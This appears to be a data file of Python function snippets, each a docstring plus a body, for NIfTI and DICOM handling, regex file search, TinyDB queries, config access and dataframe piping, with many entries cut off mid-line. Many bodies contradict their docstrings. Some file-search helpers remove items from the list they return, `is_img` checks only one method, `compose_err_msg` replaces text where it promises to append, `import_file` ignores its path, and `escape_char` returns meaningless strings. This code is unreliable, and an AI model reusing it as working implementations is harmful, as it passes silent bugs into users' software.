        "def _find_unique_id(self, table_name, sample, unique_fields):\n        \"\"\"\n        Search in `table` an item with the value of the `unique_fields` in the `data` sample.\n        Check if the the obtained result is unique. If nothing is found will return an empty list,\n        if there is more than one item found, will raise an IndexError.\n\n        Parameters\n        ----------\n        table_name: str\n\n        sample: dict\n            Sample data\n\n        unique_fields: list of str\n            Name of fields (keys) from `data` which are going to be used to build\n            a sample to look for exactly the same values in the database.\n            If None, will use every key in `data`.\n\n        Returns\n        -------\n        eid: int\n            Id of the object found with same `unique_fields`.\n            None if",
        "def is_unique(self, table_name, sample, unique_fields):\n        \"\"\"\n        Return True if an item with the value of `unique_fields`\n        from `data` is unique in the table with `table_name`.\n        False if no sample is found or more than one is found.\n\n        See function `find_unique` for more details.\n\n        Parameters\n        ----------\n        table_name: str\n\n        sample: dict\n            Sample data for query\n\n        unique_fields: str or list of str\n\n        Returns\n        -------\n        is_unique: bool\n        \"\"\"\n        if not unique_fields:\n            return False\n        if not isinstance(unique_fields, (list, tuple)):\n            unique_fields = [unique_fields]\n        return all(find_unique(self, table_name, sample, field)\n                   for",
        "def update_unique_element(self, table_name, fields, data, cond, unique_fields, raise_if_not_found=True):\n        \"\"\"Update the unique matching element to have a given set of fields.\n\n        Parameters\n        ----------\n        table_name: str\n\n        fields: dict or function[dict -> None]\n            new data/values to insert into the unique element\n            or a method that will update the elements.\n\n        data: dict\n            Sample data for query\n\n        cond: tinydb.Query\n            which elements to update\n\n        unique_fields: list of str\n\n        raise_if_not_found: bool\n            Will raise an exception if the element is not found for update.\n\n        Returns\n        -------\n        eid: int\n            The eid of the updated element if found, None otherwise.\n        \"\"\"\n        eid = None\n",
        "def search_sample_count(self, table_name, sample):\n        \"\"\"\n        Return the number of items that match the `sample` field values\n        in table `table_name`.\n        Check function search_sample for more details.\n        \"\"\"\n        return self.search_sample(table_name, sample, 'count')",
        "def is_img(obj):\n    \"\"\"Check for get_data and get_affine method in an object\n\n    Parameters\n    ----------\n    obj: any object\n        Tested object\n\n    Returns\n    -------\n    is_img: boolean\n        True if get_data and get_affine methods are present and callable,\n        False otherwise.\n    \"\"\"\n    if hasattr(obj, 'get_data'):\n        return True\n    if hasattr(obj, 'get_affine'):\n        return True\n    return False",
        "def get_data(img):\n    \"\"\"Get the data in the image without having a side effect on the Nifti1Image object\n\n    Parameters\n    ----------\n    img: Nifti1Image\n\n    Returns\n    -------\n    np.ndarray\n    \"\"\"\n    if img.data is None:\n        return None\n    return np.asarray(img.data)",
        "def get_shape(img):\n    \"\"\"\n    Return the shape of img.\n\n    Paramerers\n    -----------\n    img:\n\n    Returns\n    -------\n    shape: tuple\n    \"\"\"\n    if img.ndim == 2:\n        return (img.shape[0], img.shape[1])\n    else:\n        return (img.shape[0], img.shape[1], img.shape[2])",
        "def check_shape(one_img, another_img, only_check_3d=False):\n    \"\"\"\n    Return true if one_img and another_img have the same shape.\n    False otherwise.\n    If both are nibabel.Nifti1Image will also check for affine matrices.\n\n    Parameters\n    ----------\n    one_img: nibabel.Nifti1Image or np.ndarray\n\n    another_img: nibabel.Nifti1Image  or np.ndarray\n\n    only_check_3d: bool\n        If True will check only the 3D part of the affine matrices when they have more dimensions.\n\n    Raises\n    ------\n    NiftiFilesNotCompatible\n    \"\"\"\n    if not isinstance(one_img, nibabel.Nifti1Image):\n        raise TypeError(\"Input is not a nibabel.Nifti1Image",
        "def affine_matrices_close(one_img, another_img, only_check_3d=False):\n    \"\"\"\n    Return True if the affine matrix of one_img is close to the affine matrix of another_img.\n    False otherwise.\n\n    Parameters\n    ----------\n    one_img: nibabel.Nifti1Image\n\n    another_img: nibabel.Nifti1Image\n\n    only_check_3d: bool\n        If True will extract only the 3D part of the affine matrices when they have more dimensions.\n\n    Returns\n    -------\n    bool\n\n    Raises\n    ------\n    ValueError\n    \"\"\"\n    if not only_check_3d:\n        one_affine_matrices = one_img.affine_matrices\n        another_affine_matrices = another_img.affine_matrices\n\n",
        "def print_img(img, imgs, print_img=True):\n    \"\"\"Printing of img or imgs\"\"\"\n    if print_img:\n        print(\"Image:\")\n        for i in range(len(imgs)):\n            print(\"{0} {1}\".format(imgs[i].name, imgs[i].size))\n    else:\n        print(\"Image:\")\n        for i in range(len(imgs)):\n            print(\"{0} {1}\".format(imgs[i].name, imgs[i].size))",
        "def same_shape(array1, array2, nd_to_check=3):\n    \"\"\"\n    Returns true if array1 and array2 have the same shapes, false\n    otherwise.\n\n    Parameters\n    ----------\n    array1: numpy.ndarray\n\n    array2: numpy.ndarray\n\n    nd_to_check: int\n        Number of the dimensions to check, i.e., if == 3 then will check only the 3 first numbers of array.shape.\n    Returns\n    -------\n    bool\n    \"\"\"\n    if array1.ndim != array2.ndim:\n        return False\n    if array1.shape != array2.shape:\n        return False\n    if array1.dtype != array2.dtype:\n        return False\n    return True",
        "def match_files(regex, wd):\n    \"\"\"\n    Create a list of regex matches that result from the match_regex\n    of all file names within wd.\n    The list of files will have wd as path prefix.\n\n    @param regex: string\n    @param wd: string\n    working directory\n    @return:\n    \"\"\"\n    files = []\n    for root, dirs, files in os.walk(wd):\n        for f in files:\n            if re.match(regex, f):\n                files.remove(f)\n    return files",
        "def get_folder_paths_matching_regex(folder_path, regex):\n    \"\"\"\n    Returns absolute paths of folders that match the regex within folder_path and\n    all its children folders.\n\n    Note: The regex matching is done using the match function\n    of the re module.\n\n    Parameters\n    ----------\n    folder_path: string\n\n    regex: string\n\n    Returns\n    -------\n    A list of strings.\n    \"\"\"\n    folder_paths = []\n    for root, dirs, files in os.walk(folder_path):\n        for filename in files:\n            if re.match(regex, filename):\n                folder_paths.append(os.path.join(root, filename))\n    return folder_paths",
        "def get_files_in_dir(file_dir, search_regex):\n    \"\"\"\n    Creates a list of files that match the search_regex within file_dir.\n    The list of files will have file_dir as path prefix.\n\n    Parameters\n    ----------\n    @param file_dir:\n\n    @param search_regex:\n\n    Returns:\n    --------\n    List of paths to files that match the search_regex\n    \"\"\"\n    file_list = []\n    for root, dirs, files in os.walk(file_dir):\n        for filename in files:\n            if re.search(search_regex, filename):\n                file_list.append(os.path.join(root, filename))\n    return file_list",
        "def get_files_in_folder(folder_path, regex):\n    \"\"\"\n    Returns absolute paths of files that match the regex within file_dir and\n    all its children folders.\n\n    Note: The regex matching is done using the search function\n    of the re module.\n\n    Parameters\n    ----------\n    folder_path: string\n\n    regex: string\n\n    Returns\n    -------\n    A list of strings.\n    \"\"\"\n    files = []\n    for root, dirs, files in os.walk(folder_path):\n        for filename in files:\n            if re.search(regex, filename):\n                files.remove(filename)\n    return files",
        "def get_files_in_folder(folder_path, regex):\n    \"\"\"\n    Returns absolute paths of files that match the regexs within folder_path and\n    all its children folders.\n\n    This is an iterator function that will use yield to return each set of\n    file_paths in one iteration.\n\n    Will only return value if all the strings in regex match a file name.\n\n    Note: The regex matching is done using the search function\n    of the re module.\n\n    Parameters\n    ----------\n    folder_path: string\n\n    regex: strings\n\n    Returns\n    -------\n    A list of strings.\n    \"\"\"\n    for root, dirs, files in os.walk(folder_path):\n        for filename in files:\n            if re.search(regex, filename):\n                yield os.path.join(root, filename)",
        "def _get_files(folder):\n    \"\"\"\n    Generator that loops through all absolute paths of the files within folder\n\n    Parameters\n    ----------\n    folder: str\n    Root folder start point for recursive search.\n\n    Yields\n    ------\n    fpath: str\n    Absolute path of one file in the folders\n    \"\"\"\n    for root, dirs, files in os.walk(folder):\n        for fname in files:\n            yield os.path.join(root, fname)",
        "def glob_files(base_directory, regex):\n    \"\"\"\n    Uses glob to find all files or folders that match the regex\n    starting from the base_directory.\n\n    Parameters\n    ----------\n    base_directory: str\n\n    regex: str\n\n    Returns\n    -------\n    files: list\n    \"\"\"\n    files = []\n    for root, dirs, files in os.walk(base_directory):\n        for filename in files:\n            if re.search(regex, filename):\n                files.remove(filename)\n    return files",
        "def compose_err_msg(msg, **kwargs):\n    \"\"\"Append key-value pairs to msg, for display.\n\n    Parameters\n    ----------\n    msg: string\n        arbitrary message\n    kwargs: dict\n        arbitrary dictionary\n\n    Returns\n    -------\n    updated_msg: string\n        msg, with \"key: value\" appended. Only string values are appended.\n\n    Example\n    -------\n    >>> compose_err_msg('Error message with arguments...', arg_num=123, \\\n        arg_str='filename.nii', arg_bool=True)\n    'Error message with arguments...\\\\narg_str: filename.nii'\n    >>>\n    \"\"\"\n    updated_msg = msg\n    for key, value in kwargs.items():\n        updated_msg = updated_msg.replace(key, value)\n    return updated_msg",
        "def get_group_dicom_file_paths(dicom_file_paths, header_fields):\n    \"\"\"\n    Gets a list of DICOM file absolute paths and returns a list of lists of\n    DICOM file paths. Each group contains a set of DICOM files that have\n    exactly the same headers.\n\n    Parameters\n    ----------\n    dicom_file_paths: list of str\n        List or set of DICOM file paths\n\n    header_fields: list of str\n        List of header field names to check on the comparisons of the DICOM files.\n\n    Returns\n    -------\n    dict of DicomFileSets\n        The key is one filepath representing the group (the first found).\n    \"\"\"\n    group_dicom_file_paths = {}\n    for dicom_file_path in dicom_file_paths:\n        dicom_file_set = DicomFileSets(dicom_",
        "def copy_group_dicom_files(dicom_groups, folder_path, groupby_field_name):\n    \"\"\"\n    Copy the DICOM file groups to folder_path. Each group will be copied into\n    a subfolder with named given by groupby_field.\n\n    Parameters\n    ----------\n    dicom_groups: boyle.dicom.sets.DicomFileSet\n\n    folder_path: str\n     Path to where copy the DICOM files.\n\n    groupby_field_name: str\n     DICOM field name. Will get the value of this field to name the group\n     folder.\n    \"\"\"\n    for group in dicom_groups:\n        group_name = group.get_value(groupby_field_name)\n        folder_path = os.path.join(folder_path, group_name)\n        if not os.path.exists(folder_path):",
        "def calculate_file_dists(dicom_files, field_weights,\n                         dist_method_cls=None, **kwargs):\n    \"\"\"\n    Calculates the DicomFileDistance between all files in dicom_files, using an\n    weighted Levenshtein measure between all field names in field_weights and\n    their corresponding weights.\n\n    Parameters\n    ----------\n    dicom_files: iterable of str\n        Dicom file paths\n\n    field_weights: dict of str to float\n        A dict with header field names to float scalar values, that\n        indicate a distance measure ratio for the levenshtein distance\n        averaging of all the header field names in it. e.g., {'PatientID': 1}\n\n    dist_method_cls: DicomFileDistance class\n        Distance method object to compare the files.\n        If None, the default DicomFileDistance method using Le",
        "def _check_dcmf_fields(self):\n        \"\"\"\n        Check the field values in self.dcmf1 and self.dcmf2 and returns True\n        if all the field values are the same, False otherwise.\n\n        Returns\n        -------\n        bool\n        \"\"\"\n        if self.dcmf1 is None or self.dcmf2 is None:\n            return False\n        if len(self.dcmf1) != len(self.dcmf2):\n            return False\n        for i in range(len(self.dcmf1)):\n            if self.dcmf1[i] != self.dcmf2[i]:\n                return False\n        return True",
        "def update_status(self, field_weights=None):\n        \"\"\"\n        Updates the status of the file clusters comparing the cluster\n        key files with a levenshtein weighted measure using either the\n        header_fields or self.header_fields.\n\n        Parameters\n        ----------\n        field_weights: dict of strings with floats\n            A dict with header field names to float scalar values, that indicate a distance measure\n            ratio for the levenshtein distance averaging of all the header field names in it.\n            e.g., {'PatientID': 1}\n        \"\"\"\n        if field_weights is None:\n            field_weights = self.field_weights\n        if self.status is None:\n            self.status = {}\n        for key in self.status:\n            if key in self.status:\n                if self.status[key] != field_weights[key]:\n                    self.",
        "def threshold(self, dist_matrix, perc_thr, k=0):\n        \"\"\"Thresholds a distance matrix and returns the result.\n\n        Parameters\n        ----------\n\n        dist_matrix: array_like\n        Input array or object that can be converted to an array.\n\n        perc_thr: float in range of [0,100]\n        Percentile to compute which must be between 0 and 100 inclusive.\n\n        k: int, optional\n        Diagonal above which to zero elements.\n        k = 0 (the default) is the main diagonal,\n        k < 0 is below it and k > 0 is above.\n\n        Returns\n        -------\n        array_like\n        \"\"\"\n        if not isinstance(dist_matrix, np.ndarray):\n            dist_matrix = np.asarray(dist_matrix)\n\n        dist_matrix = dist_matrix.copy()",
        "def get_same_folder_groups(self, folder_depth):\n        \"\"\"\n        Returns a list of 2-tuples with pairs of dicom groups that\n        are in the same folder within given depth.\n\n        Parameters\n        ----------\n        folder_depth: int\n        Path depth to check for folder equality.\n\n        Returns\n        -------\n        list of tuples of str\n        \"\"\"\n        same_folder_groups = []\n        for group in self.get_groups(folder_depth):\n            if group.get_group_type() == 'DICOM':\n                same_folder_groups.append((group.get_group_name(), group))\n        return same_folder_groups",
        "def extend_lists(self, indices):\n        \"\"\"Extend the lists within the DICOM groups dictionary.\n        The indices will indicate which list have to be extended by which\n        other list.\n\n        Parameters\n        ----------\n        indices: list or tuple of 2 iterables of int, bot having the same len\n             The indices of the lists that have to be merged, both iterables\n             items will be read pair by pair, the first is the index to the\n             list that will be extended with the list of the second index.\n             The indices can be constructed with Numpy e.g.,\n             indices = np.where(square_matrix)\n        \"\"\"\n        if indices is None:\n            return\n        if isinstance(indices, (list, tuple)):\n            for i, item in enumerate(indices):\n                if i == 0:\n                    self.groups[item] = indices[0]\n                else",
        "def copy_file_groups(self, folder_path, groupby_field_name=None):\n        \"\"\"\n        Copy the file groups to folder_path. Each group will be copied into\n        a subfolder with named given by groupby_field.\n\n        Parameters\n        ----------\n        folder_path: str\n         Path to where copy the DICOM files.\n\n        groupby_field_name: str\n         DICOM field name. Will get the value of this field to name the group\n         folder. If empty or None will use the basename of the group key file.\n        \"\"\"\n        if groupby_field_name is None:\n            groupby_field_name = os.path.basename(self.group_key_file)\n        for group in self.file_groups:\n            group_path = os.path.join(folder_path, groupby_field_name)\n            shutil.copytree(",
        "def get_group_key_file_value_dict(self, field_name, field_to_use_as_key=None):\n        \"\"\"\n        Return a dictionary where the key is the group key file path and\n        the values are sets of unique values of the field name of all DICOM\n        files in the group.\n\n        Parameters\n        ----------\n        field_name: str\n         Name of the field to read from all files\n\n        field_to_use_as_key: str\n         Name of the field to get the value and use as key.\n         If None, will use the same key as the dicom_groups.\n\n        Returns\n        -------\n        Dict of sets\n        \"\"\"\n        key_file_path_dict = {}\n        for key_file_path in self.dicom_groups:\n            key_file_path_dict[key_file_",
        "def get_config(name, fallback=None):\n    \"\"\"Gets a config by name.\n\n    In the case where the config name is not found, will use fallback value.\n    \"\"\"\n    if name in _CONFIGS:\n        return _CONFIGS[name]\n    if fallback is not None:\n        return fallback\n    raise ConfigNotFound(name)",
        "def _is_bool(value):\n    \"\"\"Checks if a config value is set to a valid bool value.\"\"\"\n    if value is None:\n        return False\n    if isinstance(value, bool):\n        return value\n    if isinstance(value, str):\n        return value.lower() in ('true', 't', 'yes', 'y')\n    raise ValueError('Invalid bool value: %s' % value)",
        "def set(self, name, value):\n        \"\"\"Set a config by name to a value.\"\"\"\n        if name not in self.configs:\n            raise ValueError(\"Config %s not found\" % name)\n        self.configs[name] = value",
        "def _get_cert_path(cert_file, cert_path):\n    \"\"\"\n    Path to certificate related files, either a single file path or a\n    tuple. In the case of no security, returns None.\n    \"\"\"\n    if cert_file is None:\n        return None\n    if isinstance(cert_file, tuple):\n        return _get_cert_path(*cert_file)\n    return _get_cert_path(cert_file)",
        "def set_token_cache(self, token_cache):\n        \"\"\"Set AAD token cache.\"\"\"\n        if not isinstance(token_cache, TokenCache):\n            raise TypeError(\"Token cache must be a TokenCache instance.\")\n        self._token_cache = token_cache",
        "def set_metadata(self, metadata):\n        \"\"\"Set AAD metadata.\"\"\"\n        if not isinstance(metadata, dict):\n            raise TypeError(\"metadata must be a dictionary\")\n        self._metadata = metadata",
        "def set_cert_usage_paths(self, cert_usage_paths):\n        \"\"\"Set certificate usage paths\"\"\"\n        if cert_usage_paths is None:\n            return\n        if not isinstance(cert_usage_paths, list):\n            cert_usage_paths = [cert_usage_paths]\n        for cert_usage_path in cert_usage_paths:\n            if not os.path.exists(cert_usage_path):\n                raise ValueError(\"Certificate usage path %s does not exist\" % cert_usage_path)\n            if not os.path.isdir(cert_usage_path):\n                raise ValueError(\"Certificate usage path %s is not a directory\" % cert_usage_path)",
        "def get_objects_with_field(olist, fieldname, fieldval):\n    \"\"\"\n    Returns a list with of the objects in olist that have a fieldname valued as fieldval\n\n    Parameters\n    ----------\n    olist: list of objects\n\n    fieldname: string\n\n    fieldval: anything\n\n    Returns\n    -------\n    list of objets\n    \"\"\"\n    return [o for o in olist if o.get(fieldname) == fieldval]",
        "def can_compile(string):\n    \"\"\"\n    Checks whether the re module can compile the given regular expression.\n\n    Parameters\n    ----------\n    string: str\n\n    Returns\n    -------\n    boolean\n    \"\"\"\n    try:\n        re.compile(string)\n        return True\n    except re.error:\n        return False",
        "def fnmatch(string):\n    \"\"\"\n    Returns True if the given string is considered a fnmatch\n    regular expression, False otherwise.\n    It will look for\n\n    :param string: str\n    \"\"\"\n    if not isinstance(string, str):\n        return False\n    return fnmatch_pattern(string, re.compile(r'^.*$'))",
        "def nth_match(strings, pattern, nth, lookup_func):\n    \"\"\"Return index of the nth match found of pattern in strings\n\n    Parameters\n    ----------\n    strings: list of str\n        List of strings\n\n    pattern: str\n        Pattern to be matched\n\n    nth: int\n        Number of times the match must happen to return the item index.\n\n    lookup_func: callable\n        Function to match each item in strings to the pattern, e.g., re.match or re.search.\n\n    Returns\n    -------\n    index: int\n        Index of the nth item that matches the pattern.\n        If there are no n matches will return -1\n    \"\"\"\n    if nth < 0:\n        raise ValueError('nth must be a positive integer')\n    if nth > len(strings):\n        raise ValueError('nth must be less than the length of strings')",
        "def disable_interactive():\n    \"\"\"Generate a dcm2nii configuration file that disable the interactive\n    mode.\n    \"\"\"\n    config = ConfigObj()\n    config.set_section('interactive')\n    config.set_boolean('interactive', False)\n    config.write()",
        "def run_dcm2nii(work_dir, arguments):\n    \"\"\"\n    Converts all DICOM files within `work_dir` into one or more\n    NifTi files by calling dcm2nii on this folder.\n\n    Parameters\n    ----------\n    work_dir: str\n        Path to the folder that contain the DICOM files\n\n    arguments: str\n        String containing all the flag arguments for `dcm2nii` CLI.\n\n    Returns\n    -------\n    sys_code: int\n        dcm2nii execution return code\n    \"\"\"\n    sys_code = 0\n    for filename in os.listdir(work_dir):\n        if filename.endswith('.dcm'):\n            filename = filename[:-5]\n            if filename.endswith('.nii'):\n                filename = filename[:-4]\n            if filename.endswith",
        "def dcm2nii(input_dir, output_dir, filename):\n    \"\"\"\n    Call MRICron's `dcm2nii` to convert the DICOM files inside `input_dir`\n    to Nifti and save the Nifti file in `output_dir` with a `filename` prefix.\n\n    Parameters\n    ----------\n    input_dir: str\n        Path to the folder that contains the DICOM files\n\n    output_dir: str\n        Path to the folder where to save the NifTI file\n\n    filename: str\n        Output file basename\n\n    Returns\n    -------\n    filepaths: list of str\n        List of file paths created in `output_dir`.\n    \"\"\"\n    filepaths = []\n    for root, dirs, files in os.walk(input_dir):\n        for filename in files:\n            filepath = os.path.join",
        "def clean_filepaths(filepaths):\n    \"\"\"\n    Return a subset of `filepaths`. Keep only the files that have a basename longer than the\n    others with same suffix.\n    This works based on that dcm2nii appends a preffix character for each processing\n    step it does automatically in the DICOM to NifTI conversion.\n\n    Parameters\n    ----------\n    filepaths: iterable of str\n\n    Returns\n    -------\n    cleaned_paths: iterable of str\n    \"\"\"\n    cleaned_paths = set()\n    for filepath in filepaths:\n        basename = os.path.basename(filepath)\n        if basename.endswith('.nii'):\n            continue\n        if basename.endswith('.nii.gz'):\n            continue\n        if basename.endswith('.nii.bz2'):\n            continue\n        cleaned_paths.add(filepath",
        "def _transform_tuple(self, name, value):\n        \"\"\"Transform a named tuple into a dictionary\"\"\"\n        if isinstance(value, tuple):\n            return {name: self._transform_tuple(name, v) for v in value}\n        return {name: value}",
        "def extend_lists(adict, indices, pop_later=False, copy=False):\n    \"\"\"Extend the within a dict of lists. The indices will indicate which\n    list have to be extended by which other list.\n\n    Parameters\n    ----------\n    adict: OrderedDict\n        An ordered dictionary of lists\n\n    indices: list or tuple of 2 iterables of int, bot having the same length\n        The indices of the lists that have to be merged, both iterables items\n         will be read pair by pair, the first is the index to the list that\n         will be extended with the list of the second index.\n         The indices can be constructed with Numpy e.g.,\n         indices = np.where(square_matrix)\n\n    pop_later: bool\n        If True will oop out the lists that are indicated in the second\n         list of indices.\n\n    copy: bool\n       ",
        "def _get_dict_lists(list_of_dicts, keys=None):\n    \"\"\"\n    Return a dict of lists from a list of dicts with the same keys.\n    For each dict in list_of_dicts with look for the values of the\n    given keys and append it to the output dict.\n\n    Parameters\n    ----------\n    list_of_dicts: list of dicts\n\n    keys: list of str\n        List of keys to create in the output dict\n        If None will use all keys in the first element of list_of_dicts\n    Returns\n    -------\n    DefaultOrderedDict of lists\n    \"\"\"\n    if keys is None:\n        keys = list(list_of_dicts[0].keys())\n    output_dict = OrderedDict()\n    for d in list_of_dicts:\n        for k in keys:\n            output_dict[k] = d",
        "def import_file(filepath, mod_name=None):\n    \"\"\"\n    Imports the contents of filepath as a Python module.\n\n    :param filepath: string\n\n    :param mod_name: string\n    Name of the module when imported\n\n    :return: module\n    Imported module\n    \"\"\"\n    if mod_name is None:\n        mod_name = filepath\n    try:\n        mod = __import__(mod_name)\n    except ImportError:\n        raise ImportError(\"Could not import module: %s\" % mod_name)\n    return mod",
        "def copy_files(configfile, destpath, overwrite, sub_node):\n    \"\"\"\n    Copies the files in the built file tree map\n    to despath.\n\n    :param configfile: string\n     Path to the FileTreeMap config file\n\n    :param destpath: string\n     Path to the files destination\n\n    :param overwrite: bool\n     Overwrite files if they already exist.\n\n    :param sub_node: string\n     Tree map configuration sub path.\n     Will copy only the contents within this sub-node\n    \"\"\"\n    # Get the FileTreeMap object\n    ftm = FileTreeMap(configfile)\n\n    # Get the FileTreeMap sub-node\n    sub_node = ftm.get_sub_node(sub_node)\n\n    # Copy the files\n    for filename in sub_node.get_files():\n        dest",
        "def spss2csv(inputfile, outputfile=None):\n    \"\"\"\n    Transforms the input .sav SPSS file into other format.\n    If you don't specify an outputfile, it will use the\n    inputfile and change its extension to .csv\n    \"\"\"\n    if outputfile is None:\n        outputfile = inputfile\n    if not os.path.exists(outputfile):\n        os.makedirs(outputfile)\n    with open(inputfile, 'rb') as f:\n        with open(outputfile, 'wb') as f2:\n            csvwriter = csv.writer(f2, delimiter=',', quotechar='\"')\n            for line in f:\n                csvwriter.writerow(line.split())",
        "def load_nifti_mask(image, allow_empty=False):\n    \"\"\"\n    Load a Nifti mask volume.\n\n    Parameters\n    ----------\n    image: img-like object or boyle.nifti.NeuroImage or str\n        Can either be:\n        - a file path to a Nifti image\n        - any object with get_data() and get_affine() methods, e.g., nibabel.Nifti1Image.\n        If niimg is a string, consider it as a path to Nifti image and\n        call nibabel.load on it. If it is an object, check if get_data()\n        and get_affine() methods are present, raise TypeError otherwise.\n\n    allow_empty: boolean, optional\n        Allow loading an empty mask (full of 0 values)\n\n    Returns\n    -------\n    nib",
        "def load_mask(image, allow_empty=False):\n    \"\"\"\n    Load a Nifti mask volume and return its data matrix as boolean and affine.\n\n    Parameters\n    ----------\n    image: img-like object or boyle.nifti.NeuroImage or str\n        Can either be:\n        - a file path to a Nifti image\n        - any object with get_data() and get_affine() methods, e.g., nibabel.Nifti1Image.\n        If niimg is a string, consider it as a path to Nifti image and\n        call nibabel.load on it. If it is an object, check if get_data()\n        and get_affine() methods are present, raise TypeError otherwise.\n\n    allow_empty: boolean, optional\n        Allow loading an empty mask (full of 0 values)\n\n    Returns\n",
        "def create_mask(filelist):\n    \"\"\"\n    Creates a binarised mask with the union of the files in filelist.\n\n    Parameters\n    ----------\n    filelist: list of img-like object or boyle.nifti.NeuroImage or str\n        List of paths to the volume files containing the ROIs.\n        Can either be:\n        - a file path to a Nifti image\n        - any object with get_data() and get_affine() methods, e.g., nibabel.Nifti1Image.\n        If niimg is a string, consider it as a path to Nifti image and\n        call nibabel.load on it. If it is an object, check if get_data()\n        and get_affine() methods are present, raise TypeError otherwise.\n\n    Returns\n    -------\n    ndarray of bools\n        Mask volume\n\n",
        "def read_nifti_file(nii_file, mask_file):\n    \"\"\"\n    Read a Nifti file nii_file and a mask Nifti file.\n    Returns the voxels in nii_file that are within the mask, the mask indices\n    and the mask shape.\n\n    Parameters\n    ----------\n    image: img-like object or boyle.nifti.NeuroImage or str\n        Can either be:\n        - a file path to a Nifti image\n        - any object with get_data() and get_affine() methods, e.g., nibabel.Nifti1Image.\n        If niimg is a string, consider it as a path to Nifti image and\n        call nibabel.load on it. If it is an object, check if get_data()\n        and get_affine() methods are present",
        "def extract_nii_signals(image, mask_file, smooth_mm=None, smooth_sigma=None,\n                        smooth_sigma_min=None, smooth_sigma_max=None,\n                        smooth_sigma_step=None, smooth_nans=True,\n                        remove_nans=True, mask_img=None, mask_indices=None,\n                        mask_shape=None, nii_file=None, mask_data=None,\n                        mask_indices_mask=None, mask_shape_mask=None,\n                        mask_data_mask=None, mask_data_indices=None,\n                        mask_data_shape=None, mask_data_indices_mask=None,\n                        mask_data_shape_mask=None, mask_data_indices_mask=None,\n                        mask_data_shape_mask=None, mask_data_indices",
        "def vector_to_volume(arr, mask):\n    \"\"\"\n    Transform a given vector to a volume. This is a reshape function for\n    3D flattened and maybe masked vectors.\n\n    Parameters\n    ----------\n    arr: np.array\n        1-Dimensional array\n\n    mask: numpy.ndarray\n        Mask image. Must have 3 dimensions, bool dtype.\n\n    Returns\n    -------\n    np.ndarray\n    \"\"\"\n    if mask.ndim == 3:\n        mask = mask.astype(bool)\n    return np.reshape(arr, (-1, 3)) * mask",
        "def vector_to_volume(arr, mask, dtype=None):\n    \"\"\"Transform a given vector to a volume. This is a reshape function for\n    4D flattened masked matrices where the second dimension of the matrix\n    corresponds to the original 4th dimension.\n\n    Parameters\n    ----------\n    arr: numpy.array\n        2D numpy.array\n\n    mask: numpy.ndarray\n        Mask image. Must have 3 dimensions, bool dtype.\n\n    dtype: return type\n        If None, will get the type from vector\n\n    Returns\n    -------\n    data: numpy.ndarray\n        Unmasked data.\n        Shape: (mask.shape[0], mask.shape[1], mask.shape[2], X.shape[1])\n    \"\"\"\n    if mask.ndim == 3:\n        mask = np.asarray(mask, dtype=np.bool)\n        mask",
        "def create_masked_array(img_filelist, mask_file, outdtype=None):\n    \"\"\"\n    From the list of absolute paths to nifti files, creates a Numpy array\n    with the masked data.\n\n    Parameters\n    ----------\n    img_filelist: list of str\n        List of absolute file paths to nifti files. All nifti files must have\n        the same shape.\n\n    mask_file: str\n        Path to a Nifti mask file.\n        Should be the same shape as the files in nii_filelist.\n\n    outdtype: dtype\n        Type of the elements of the array, if not set will obtain the dtype from\n        the first nifti file.\n\n    Returns\n    -------\n    outmat:\n        Numpy array with shape N x prod(vol.shape) containing the N files as flat vectors.",
        "def create_client(self, **kwargs):\n        \"\"\"Create a client for Service Fabric APIs.\"\"\"\n        client = self.client_class(**kwargs)\n        self.clients.append(client)\n        return client",
        "def aggregate(self, clazz, new_col, *args):\n        \"\"\"\n        Aggregate the rows of the DataFrame into a single value.\n\n        :param clazz: name of a class that extends class Callable\n        :type clazz: class\n        :param new_col: name of the new column\n        :type new_col: str\n        :param args: list of column names of the object that function \n        should be applied to\n        :type args: tuple\n        :return: returns a new dataframe object with the aggregated value\n        :rtype: DataFrame\n        \"\"\"\n        if len(args) == 0:\n            raise ValueError(\"No column names were given\")\n        if len(args) > 1:\n            raise ValueError(\"More than one column names were given\")\n        if len(args) == 1:\n            return self.apply(lambda x: x.aggregate(clazz, new",
        "def group(*args):\n    \"\"\"\n    Pipeable grouping method.\n\n    Takes either\n      - a dataframe and a tuple of strings for grouping,\n      - a tuple of strings if a dataframe has already been piped into.\n    \n    :Example:\n        \n    group(dataframe, \"column\")\n    \n    :Example:\n    \n    dataframe >> group(\"column\")\n    \n    :param args: tuple of arguments\n    :type args: tuple\n    :return: returns a grouped dataframe object\n    :rtype: GroupedDataFrame\n    \"\"\"\n    if len(args) == 1:\n        return GroupedDataFrame(args[0])\n    else:\n        return GroupedDataFrame(args)",
        "def aggregate(df, func, *args):\n    \"\"\"\n    Pipeable aggregation method.\n    \n    Takes either \n     - a dataframe and a tuple of arguments required for aggregation,\n     - a tuple of arguments if a dataframe has already been piped into.\n    In any case one argument has to be a class that extends callable.\n\n    :Example:\n\n    aggregate(dataframe, Function, \"new_col_name\", \"old_col_name\")\n\n    :Example:\n\n    dataframe >> aggregate(Function, \"new_col_name\", \"old_col_name\")\n\n    :param args: tuple of arguments\n    :type args: tuple\n    :return: returns a dataframe object\n    :rtype: DataFrame\n    \"\"\"\n    if len(args) == 1:\n        return func(df, *args)\n    else:\n        return df.aggregate(",
        "def subset(*args):\n    \"\"\"\n    Pipeable subsetting method.\n\n    Takes either\n     - a dataframe and a tuple of arguments required for subsetting,\n     - a tuple of arguments if a dataframe has already been piped into.\n\n    :Example:\n        \n    subset(dataframe, \"column\")\n    \n    :Example:\n    \n    dataframe >> subset(\"column\")\n\n    :param args: tuple of arguments\n    :type args: tuple\n    :return: returns a dataframe object\n    :rtype: DataFrame\n    \"\"\"\n    if len(args) == 1:\n        return args[0]\n    else:\n        return DataFrame(\n            data=list(zip(args[0], args[1:])),\n            columns=args[0],\n            index=args[1:],\n            name=args[0])",
        "def modify(df, func, *args):\n    \"\"\"\n    Pipeable modification method \n    \n    Takes either \n     - a dataframe and a tuple of arguments required for modification,\n     - a tuple of arguments if a dataframe has already been piped into.\n    In any case one argument has to be a class that extends callable.\n\n    :Example:\n\n    modify(dataframe, Function, \"new_col_name\", \"old_col_name\")\n    \n    :Example:\n\n    dataframe >> modify(Function, \"new_col_name\", \"old_col_name\")\n\n    :param args: tuple of arguments\n    :type args: tuple\n    :return: returns a dataframe object\n    :rtype: DataFrame\n    \"\"\"\n    if len(args) == 1:\n        return df.modify(func, *args)\n    else:\n        return df.",
        "def escape_char(char):\n    \"\"\"Escape a single character\"\"\"\n    if char in string.printable:\n        return char\n    if char in string.digits:\n        return string.ascii_letters + string.digits\n    return string.ascii_letters + string.digits + string.punctuation + char",
